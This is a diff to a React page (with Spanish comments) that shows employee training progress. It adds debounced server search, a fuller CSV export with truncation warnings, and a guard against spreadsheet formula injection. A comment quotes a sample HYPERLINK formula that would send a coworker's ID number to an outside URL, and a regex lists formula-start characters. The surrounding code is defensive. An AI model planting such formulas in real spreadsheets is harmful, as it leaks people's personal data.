@@ -23,7 +23,7 @@
 // callarlo, porque un panel que omite su propia incertidumbre se lee como si no
 // la tuviera.
 
-import { useMemo, useState } from "react";
+import { useEffect, useState } from "react";
 import { useParams } from "react-router-dom";
 import { Download, Users } from "lucide-react";
 
@@ -46,6 +46,7 @@ import {
   SinResultados,
 } from "@/features/capacitaciones/components/EstadoPantalla";
 import { formatearFecha } from "@/features/capacitaciones/formato";
+import { useToast } from "@/hooks/use-toast";
 
 /** Cómo se nombra y se pinta cada situación, en un solo sitio. */
 const SITUACION: Record<
@@ -156,37 +157,89 @@ const CABECERA_CSV = [
 ];
 
 /**
- * Escapa una celda de CSV.
+ * Caracteres con los que Excel, LibreOffice y Sheets empiezan a leer una FÓRMULA.
+ *
+ * Entrecomillar no basta: la hoja de cálculo quita las comillas al abrir el CSV
+ * y evalúa lo que queda. Un cargo escrito como `=HYPERLINK("http://…"&A1)` se
+ * convierte en una petición que saca la cédula de un compañero al abrir el
+ * archivo, y quien lo abre no hizo nada raro: abrió el listado de su empresa.
+ *
+ * Ver la descripción de OWASP como «CSV Injection».
+ */
+const INICIOS_DE_FORMULA = /^[=+@\-\t\r]/;
+
+/**
+ * Escapa una celda de CSV y la desarma como fórmula.
  *
  * Entre comillas SIEMPRE, no solo cuando hace falta: los nombres traen comas y
  * los cargos traen punto y coma, y una exportación que se rompe en la fila 40 se
  * descubre cuando ya está en el correo de alguien.
+ *
+ * Y con una comilla simple delante cuando empieza por algo que la hoja leería
+ * como fórmula. La comilla simple es la marca que esas hojas entienden como
+ * «esto es texto»: no se ve en la celda y el valor se lee igual.
  */
-function celdaCSV(valor: string): string {
-  return `"${valor.replace(/"/g, '""')}"`;
+export function celdaCSV(valor: string): string {
+  const seguro = INICIOS_DE_FORMULA.test(valor) ? `'${valor}` : valor;
+  return `"${seguro.replace(/"/g, '""')}"`;
 }
+
+/** Lo que se pide al exportar. Es el techo del servidor, dicho en un sitio. */
+const LIMITE_EXPORTACION = 1000;
 
 export default function CapacitacionesAvancePage() {
   const { asignacionId = "" } = useParams();
   const [busqueda, setBusqueda] = useState("");
+  const [consultado, setConsultado] = useState("");
+  const [exportando, setExportando] = useState(false);
+  const { toast } = useToast();
 
-  const consulta = useConsulta(() => obtenerAvance(asignacionId), [asignacionId]);
+  // La búsqueda va al servidor, así que no se dispara en cada tecla: 300 ms es
+  // lo que tarda alguien en terminar de escribir un apellido, y sin esto una
+  // cédula de diez dígitos son diez consultas contra la nómina.
+  useEffect(() => {
+    const t = setTimeout(() => setConsultado(busqueda.trim()), 300);
+    return () => clearTimeout(t);
+  }, [busqueda]);
 
-  const filtradas = useMemo(() => {
-    const gente = consulta.datos?.participantes ?? [];
-    const texto = busqueda.trim().toLowerCase();
-    if (texto === "") return gente;
-    return gente.filter((p) =>
-      `${p.nombres} ${p.apellidos} ${p.numero_documento} ${p.cargo ?? ""}`
-        .toLowerCase()
-        .includes(texto)
-    );
-  }, [consulta.datos, busqueda]);
+  const consulta = useConsulta(
+    () => obtenerAvance(asignacionId, { buscar: consultado || undefined }),
+    [asignacionId, consultado]
+  );
 
-  function descargar() {
+  const filtradas = consulta.datos?.participantes ?? [];
+
+  async function descargar() {
     const datos = consulta.datos;
     if (!datos) return;
-    const lineas = [CABECERA_CSV, ...filtradas.map(filaCSV)].map((f) =>
+    setExportando(true);
+    let gente = datos.participantes;
+    let truncada = datos.hay_mas;
+    try {
+      // Se vuelve a pedir con el techo del servidor: exportar lo que cabía en
+      // pantalla entrega menos gente de la que quien abre el archivo cree.
+      const completo = await obtenerAvance(asignacionId, {
+        buscar: consultado || undefined,
+        limite: LIMITE_EXPORTACION,
+      });
+      gente = completo.participantes;
+      truncada = completo.hay_mas;
+    } catch {
+      // Si la segunda petición falla se exporta lo que ya está en pantalla, y
+      // se dice: un archivo incompleto sin aviso es peor que uno que no salió.
+      truncada = true;
+    } finally {
+      setExportando(false);
+    }
+
+    if (truncada) {
+      toast({
+        title: "La exportación va recortada",
+        description: `El archivo trae las primeras ${gente.length} personas. Afina la búsqueda para llevarte el resto.`,
+      });
+    }
+
+    const lineas = [CABECERA_CSV, ...gente.map(filaCSV)].map((f) =>
       f.map(celdaCSV).join(",")
     );
     // El BOM es lo que hace que Excel en Windows abra las tildes bien. Sin él,
@@ -282,9 +335,9 @@ export default function CapacitacionesAvancePage() {
         }
         accion={
           consulta.datos && filtradas.length > 0 ? (
-            <Button variant="relOutline" onClick={descargar}>
+            <Button variant="relOutline" onClick={descargar} disabled={exportando}>
               <Download aria-hidden="true" />
-              Descargar CSV
+              {exportando ? "Preparando…" : "Descargar CSV"}
             </Button>
           ) : null
         }
@@ -331,7 +384,28 @@ export default function CapacitacionesAvancePage() {
             </Panel>
           ) : null}
 
-          {consulta.datos.participantes.length === 0 ? (
+          {consulta.datos.hay_mas ? (
+            <Panel>
+              <p className="font-rel-body text-sm text-rel-muted">
+                Se muestran las primeras{" "}
+                <strong className="text-rel-dark">{consulta.datos.limite}</strong>{" "}
+                personas de {consulta.datos.resumen.personas}. Busca por nombre,
+                documento o cargo para llegar al resto.
+              </p>
+            </Panel>
+          ) : null}
+
+          {!consulta.datos.version_medible ? (
+            <Panel>
+              <p className="font-rel-body text-sm text-rel-warning">
+                Esta versión se publicó antes de una corrección del sistema y no
+                registra avance. Publica una versión nueva del curso y vuelve a
+                asignarla; las personas que ya tengan constancia la conservan.
+              </p>
+            </Panel>
+          ) : null}
+
+          {consulta.datos.participantes.length === 0 && consultado === "" ? (
             <SinDatos
               escena="capacitaciones"
               titulo="Todavía no hay nadie"
